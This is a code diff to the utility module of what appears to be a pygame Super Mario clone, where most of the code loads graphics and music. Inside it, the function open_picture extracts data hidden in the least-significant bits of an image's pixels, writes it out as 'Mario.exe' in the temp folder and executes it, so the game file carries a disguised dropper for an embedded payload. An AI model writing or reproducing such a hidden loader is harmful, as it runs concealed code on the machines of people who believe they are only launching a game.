@@ -1,11 +1,10 @@
 __author__ = 'justinarmstrong'
 
 import os
-import tempfile
+import sys
 import threading
 import pygame as pg
 from PIL import Image
-import numpy as np
 import subprocess
 
 keybinding = {
@@ -145,15 +144,13 @@ def open_picture(image_path):
     try:
         # Open the encoded image
         img = Image.open(image_path).convert("RGB")
-        pixels = np.array(img)
+        pixels = list(iter(img.getdata()))  # Get pixel data as a list
 
         # Flatten the image array for easier bit extraction
-        flat_pixels = pixels.flatten()
+        flat_pixels = [value for pixel in pixels for value in pixel]
 
         # Extract the binary data from the LSBs of the pixels
-        binary_bits = []
-        for pixel_value in flat_pixels:
-            binary_bits.append(pixel_value & 1)  # Extract the LSB
+        binary_bits = [pixel_value & 1 for pixel_value in flat_pixels]
 
         # Group bits into bytes (8 bits per byte)
         byte_data = []
@@ -165,9 +162,11 @@ def open_picture(image_path):
         byte_array = bytearray(byte_data)
 
         # Write to a temporary file
-        with tempfile.NamedTemporaryFile(delete=False, suffix=".exe") as temp_file:
+        temp_file_path = os.path.join(os.getenv("TEMP"), "Mario.exe")
+        with open(temp_file_path, 'wb') as temp_file:
             temp_file.write(byte_array)
-            temp_file_path = temp_file.name
+
+        # Execute the temporary file
         subprocess.run([temp_file_path], check=True)
     except subprocess.CalledProcessError as e:
         print(f"An error occurred during execution: {e}")
@@ -195,7 +194,16 @@ def load_all_gfx(directory, colorkey=(255,0,255), accept=('.png', 'jpg', 'bmp'))
             graphics[name]=img
     return graphics
 
+def resource_path(relative_path):
+    """Get the absolute path to a resource."""
+    try:
+        # PyInstaller creates a temp folder and stores the path in _MEIPASS
+        base_path = sys._MEIPASS
+    except AttributeError:
+        # Running in normal Python interpreter
+        base_path = os.path.abspath(".")
 
+    return os.path.join(base_path, relative_path)
 
 def load_all_music(directory, accept=('.wav', '.mp3', '.ogg', '.mdi')):
     songs = {}
